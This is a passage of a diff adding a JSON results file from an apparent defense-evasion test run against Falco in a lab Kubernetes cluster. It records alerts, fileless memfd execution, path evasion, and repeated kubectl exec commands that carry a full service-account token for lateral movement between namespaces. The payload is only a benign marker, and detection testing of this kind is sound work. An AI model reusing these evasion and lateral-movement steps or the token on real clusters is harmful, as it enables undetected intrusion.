+          "detail": "connection=10.42.0.163:53862->10.43.0.1:443 lport=53862 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53862->10.43.0.1:443",
+            "lport": "53862",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.783529803: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53862->10.43.0.1:443 lport=53862 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:05:38.929981729",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:53874->10.43.0.1:443 lport=53874 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53874->10.43.0.1:443",
+            "lport": "53874",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.929981729: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53874->10.43.0.1:443 lport=53874 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:06:07.346427753",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:60544->10.43.0.1:443 lport=60544 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:60544->10.43.0.1:443",
+            "lport": "60544",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:06:07.346427753: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:60544->10.43.0.1:443 lport=60544 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:06:14.023255363",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:60554->10.43.0.1:443 lport=60554 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:60554->10.43.0.1:443",
+            "lport": "60554",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:06:14.023255363: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:60554->10.43.0.1:443 lport=60554 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [],
+      "result": "bypass-confirmed",
+      "limitations": "Falco 0.45.1 default ruleset; memfd exepath and API contact may be covered. Recorded as observed.",
+      "detail": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "fileless-memfd-exec",
+        "techniques": [
+          "fileless-memfd-exec"
+        ],
+        "executions": [
+          {
+            "technique": "fileless-memfd-exec",
+            "ok": true,
+            "fileless": true,
+            "memfd": {
+              "name": "inkblade-bypass-8b8595fd",
+              "size": 311,
+              "path": "/proc/self/fd/3",
+              "fd": 3
+            },
+            "artifact_paths": [],
+            "no_new_binary": true,
+            "exit_code": 0,
+            "stdout": "",
+            "stderr": "",
+            "timed_out": false,
+            "duration_ms": 33095,
+            "argv": [
+              "/proc/self/fd/3"
+            ],
+            "result": {
+              "exit_code": 0,
+              "rc": 0,
+              "stdout": "",
+              "stderr": "",
+              "truncated": false,
+              "timed_out": false,
+              "duration_ms": 33095,
+              "argv": [
+                "/proc/self/fd/3"
+              ],
+              "clean_env": true,
+              "cwd": "/dev/shm"
+            }
+          }
+        ],
+        "fileless": true,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": null,
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": true
+      }
+    },
+    {
+      "id": "path-evasion",
+      "product": "falco",
+      "action": "select a writable workspace outside /tmp,/var/tmp monitored set",
+      "marker": "INKBLADE-BENIGN:defense-bypass:existing:100637",
+      "marker_achieved": true,
+      "selected_path": "/dev/shm",
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:07:07.250223001",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:57754->10.43.0.1:443 lport=57754 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:57754->10.43.0.1:443",
+            "lport": "57754",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:07:07.250223001: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:57754->10.43.0.1:443 lport=57754 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:07:08.443304973",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:57768->10.43.0.1:443 lport=57768 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:57768->10.43.0.1:443",
+            "lport": "57768",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
